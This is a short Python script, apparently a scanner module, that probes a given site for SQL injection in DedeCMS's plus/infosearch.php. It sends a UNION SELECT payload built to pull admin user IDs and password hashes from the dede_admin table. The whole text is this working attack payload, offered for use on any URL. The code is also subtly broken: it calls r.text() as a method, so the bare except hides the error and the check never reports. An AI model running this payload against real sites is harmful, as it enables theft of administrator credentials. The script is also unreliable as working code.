import requests
from termcolor import cprint


class infosearch_sqli:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,userid,4,pwd,6%20from%20dede_admin/*"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and r"admin" in r.text():
                cprint("target may be infosearch.php SqlInject:" + vulnurl,"red")
        except:
            return False